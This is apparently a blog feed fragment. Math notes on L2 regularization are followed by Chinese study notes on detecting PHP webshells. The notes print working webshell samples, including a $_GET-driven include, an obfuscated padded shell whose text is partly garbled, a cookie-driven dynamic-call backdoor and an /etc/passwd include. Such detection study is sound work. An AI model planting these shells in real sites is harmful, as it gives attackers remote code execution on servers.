class="mord">∣</span><span class="mord">∣</span></span></span></span></p>
<p>于是有：</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mtable side="right"><mlabeledtr><mtd><mtext>(2)</mtext></mtd><mtd><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msub><mi>W</mi><mi>x</mi></msub><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>W</mi><mi mathvariant="normal">∣</mi><msub><mi mathvariant="normal">∣</mi><mi>F</mi></msub><mo>⋅</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow></mtd></mlabeledtr></mtable><annotation encoding="application/x-tex">||W_x||\leq||W||_F \cdot||x||\tag{2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mord">∣</span><span class="mord">∣</span></span><span class="tag"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">2</span></span><span class="mord">)</span></span></span></span></span></span></p>
</li>
<li>
<h3 id="l2-正则">L2 正则</h3>
</li>
</ul>
<p>​	对于线性模型：</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>W</mi><mo>(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>)</mo><mo>−</mo><mi>W</mi><mo>(</mo><msub><mi>x</mi><mn>2</mn></msub><mo>)</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><mi>C</mi><mo>(</mo><mi>W</mi><mo>)</mo><mo>⋅</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">||W(x_1)-W(x_2)|| \leq C(W)\cdot ||x_1-x_2||
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">∣</span></span></span></span></span></p>
<p>​	上述式子在**$$x_1,x_2$$ 非常接近的时候**可以等价于：</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>W</mi><mo>(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mo>)</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><mi>C</mi><mo>(</mo><mi>W</mi><mo>)</mo><mo>⋅</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">||W(x_1-x_2)||\leq C(W)\cdot||x_1-x_2||
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">∣</span></span></span></span></span></p>
<p>​	根据p—范数（欧几里得范数）性质：</p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mtable side="right"><mlabeledtr><mtd><mtext>(3)</mtext></mtd><mtd><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>W</mi><mo>(</mo><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mo>)</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mo>≤</mo><msup><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>W</mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow><mn>2</mn></msup><mo>⋅</mo><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><msub><mi>x</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi></mrow></mtd></mlabeledtr></mtable><annotation encoding="application/x-tex">||W(x_1-x_2)||\leq {||W||}^2\cdot||x_1-x_2||\tag{3}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">∣</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.204008em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord">∣</span><span class="mord">∣</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord">∣</span></span><span class="tag"><span class="strut" style="height:1.204008em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">3</span></span><span class="mord">)</span></span></span></span></span></span></p>
<p>​	对比式子(1),(2),(3)就可以发现这里的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mi>W</mi><mi mathvariant="normal">∣</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">||W||^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>就是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mo>∑</mo><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub><msubsup><mi>w</mi><mrow><mi>i</mi><mi>j</mi></mrow><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">\sum_{i,j}w_{ij}^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2499259999999999em;vertical-align:-0.43581800000000004em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.16195399999999993em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.441336em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span></span></span></span>，这就是L2正则项，我们希望该项越小则<strong>L 约束</strong>就越小。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Gridea]]></title>
        <id>https://johnyin-hub.github.io/post/hello-gridea/</id>
        <link href="https://johnyin-hub.github.io/post/hello-gridea/">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h3 id="webshell-概述">WebShell 概述</h3>
<figure data-type="image" tabindex="1"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h57y7c8zwjj21620g8tck.jpg" alt="image-20211028104035971" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1h57y7hi4pqj21lh0u00yf.jpg" alt="image-20211028141253921" loading="lazy"></figure>
<!-- more -->大师赛的
<h3 id=""></h3>
<h2 id="windows-php踩坑">windows-PHP踩坑</h2>
<h4 id="安装php">安装php</h4>
<ol>
<li>不需要安装apache，cli模式运行不需要装web服务器。</li>
<li>测试文件test.php要写完整。</li>
<li>解压路径C：\PHP7\，更改目录下php.init.development文件成 php.ini。</li>
<li>最坑需要修改php.ini配置文件、extension，去掉分号试情况添加改写。</li>
</ol>
<pre><code class="language-php">//test.php 第一个php文件
&lt;?php
	echo&quot;hello world&quot;
?&gt;
</code></pre>
<h4 id="获取php的opcode">获取php的opcode</h4>
<ol>
<li>安装vld扩展组件，在ext文件夹下添加vld.dll扩展组件。</li>
<li>修改配置文件，添加一行extension =vld（形式有可能不同，注意这个坑）</li>
</ol>
<pre><code>//命令行获取opcode
php -dvld.active=1 -dvld.execute=0 test.php
</code></pre>
<h4 id="木马分类">木马分类</h4>
<ul>
<li>
<h4 id="一句话木马">一句话木马</h4>
<h5 id="一句话木马泛指一句话的脚本最典型的功能就是为代码执行提供一种环境比如熟悉的eval函数">一句话木马泛指一句话的脚本，最典型的功能就是为代码执行提供一种环境，比如熟悉的eval()函数。</h5>
<h5 id="这种脚本大都不会脱离数据传递与数据执行这个基本框架">这种脚本大都不会脱离数据传递与数据执行这个基本框架。</h5>
</li>
<li>
<h4 id="小马">小马</h4>
<h5 id="小马至功能单一的webshell以上传文件功能居多通常作为上传大马的中转站辅助攻击者进行渗透">小马至功能单一的Webshell，以上传文件功能居多，通常作为上传大马的中转站，辅助攻击者进行渗透。</h5>
<h5 id="其文件不大也不存在口令保护">其文件不大，也不存在口令保护。</h5>
</li>
<li>
<h4 id="大马">大马</h4>
<h5 id="大马指功能强大的webshell-有些大马为了躲避检测使用了混">大马指功能强大的Webshell。有些大马为了躲避检测，使用了混</h5>
<h5 id="淆手段或者加解密压缩等技术前一种称未加密的webshell后一种成为加密的webshell">淆手段或者加解密压缩等技术，前一种称未加密的Webshell，后一种成为加密的Webshell。</h5>
</li>
</ul>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>i</mi><mi>g</mi><mi>m</mi><mi>a</mi><mo>(</mo><mi>d</mi><mo>)</mo><mo>=</mo><mi>p</mi><mo>(</mo><mi>a</mi><mo>)</mo><mo>+</mo><mi>p</mi><mo>(</mo><mi>b</mi><mo>)</mo><msup><mn>2</mn><mn>3</mn></msup></mrow><annotation encoding="application/x-tex">sigma(d)  = p(a)+p(b) 2^3
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mopen">(</span><span class="mord mathdefault">d</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span></p>
<h3 id="不能覆盖类型">不能覆盖类型</h3>
<ol>
<li>
<h5 id="自定义函数动态调用">自定义函数动态调用</h5>
<pre><code class="language-php">&lt;?php
        function xz(){
                global $b;
                $a = $_GET[$b];   #  $_GET[“xz”]
                $e = $a;
                return $e;
        }
?&gt;
&lt;?php
$b = &quot;xz&quot;;
$c = xz();
$d = $c;

include($d);   #执行
</code></pre>
</li>
<li>
<h5 id="填充垃圾数据混淆">填充垃圾数据混淆</h5>
<pre><code class="language-php">&lt;?php $rxvihnd = 'D#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}!gj}1~!&lt;2p%	x7f!~!&lt;##!&gt;!2p%Z&lt;^2	x5c2b%!&gt;!2p%!*3&gt;?*2b%)gpf{jt)67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]3bd%!&lt;5h%/#0#/*#npd/#)rrd/#00;quui#&gt;.%!&lt;***f	x27,*e	2	145	x66	157	x78&quot;))) { $kzgsoan = &quot;	x6273]y76]277#&lt;!%t2w&gt;#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]2x5cq%)ufttj	x22)gj6&lt;^#Y#	x5cq%	x27Y%!|!*#91y]c9y]g2y]#&gt;&gt;*4-1-bubE{h%)s2dc#*&lt;!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z3	162	x65	141	x74	145	x5f	146	x75	156	~	x24&lt;!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M73]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#&lt;%tdz&gt;#L4]275L3]248L3P6L1M5]D2P4*#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:&gt;:r%:|:**t%)m%=]y31M6]y3e]81#/#7e:55946-tr.984:75983:48984:71]K9]7]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]nbs+yfeobz+sfwjidsb`bj+upcotn+qsvmt+fmhpph56	x61&quot;]=1; $uas=strtolower($_SERVER[&quot;	x48	124	x54	120	x5f	%epnbss!&gt;!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#65egb17-SFEBFI,6&lt;*127-UVPFNJU,6&lt;*r (strstr($uas,&quot;	x72	166	x3a	61	x31&quot;)) or (strstr($uas	x45	116	x54&quot;]); if ((strstr($uas,&quot;	x6d	163	x69	145&quot;)) obE{h%)sutcvt)fubmgoj{hA!ost0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!7&amp;6&lt;.fmjgA	x27doj%6&lt;	x7fw6*	x7f_*#fmjgk4`{6~6&lt;tf125	x53	105	x52	137	x41	107	x24-tusqpt)%z-#:#*	x/	x24)%c*W%eN+#Qi	x5c1^W%c!&gt;!%i	x5c#-%tmw)%tww**WYsboepn)%bss-%rxBif((function_exists(&quot;	x6f	142	x5fCw*[!%rN}#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!58y]472]37y]672]48y]#&gt;s%&lt;#462]47y]252]18y]#	x24-	x24	x5c%j^	x24&gt;!	x24/%tmw/	x24)%zW2^&lt;!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxBopjudovg}x;0]=])0#)U!	x27{**u%-#j(&quot;vveljku&quot;,str_split(&quot;%tjw!&gt;!#]y84]275]y83]248]y83]256]y81]265]y72]25p!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!&lt;*#cd2bge56+#-!#]y38#-!%w:**&lt;&quot;)));$ijstbzz = $kzgsoan(&quot;&quot;, $hvcesuz); $ij)tpqsut&gt;j%!*9!	x27!hmg%)!p%!-uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!f7f_*#ujojRk3`{666~6&lt;&amp;w6&lt;	x7fw6*/#M5]DgP5]D6#&lt;%fdy&gt;#]D4]242]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!&gt;!}	x27;!&gt;&gt;&gt;!
</code></pre>
</li>
<li>
<h5 id="输入不确定">输入不确定</h5>
</li>
</ol>
<pre><code class="language-php">&lt;?php

$tqgy=$_COOKIE;       #COOKIE 输入不确定
$tvihp=$tqgy[nyin];   #exp $_POST[nyin]
if($tvihp){
	$hnl=$tvihp($tqgy[xdej]);$izp=$tvihp($tqgy[jhqp]);$wobwg=$hnl(&quot;&quot;,$izp);$wobwg();
}
</code></pre>
<pre><code class="language-php">#文件输入不确定
}
include &quot;exploits.php&quot;; 
?&gt;
</code></pre>
<pre><code class="language-php">#执行敏感文件
&lt;?
include(&quot;/etc/passwd&quot;);     #解决方案 敏感文件直接判
?&gt;

</code></pre>
<p>Assert 命令执行，配合extract函数执行</p>
<p>16进制字符串不用解码可直接执行</p>
<p>通过str_replace 替换字符串达到混淆目的，混淆出一个命令出来（yara规则辅助）</p>
<p>include 执行文件函数，需要判断目标文件是否恶意。（yara规则辅助）</p>
<p>@语法是为了抑制错误输出</p>
<p>$定义变量</p>
<p>数组拼接+字符串混淆，（yara可以检测）</p>
<p>上传move_upload_file</p>
<p>? 三元操作符 if 判断</p>
<p>反弹shell</p>
<p>敏感函数动态调用，（声明，执行）</p>
]]></content>
    </entry>
</feed>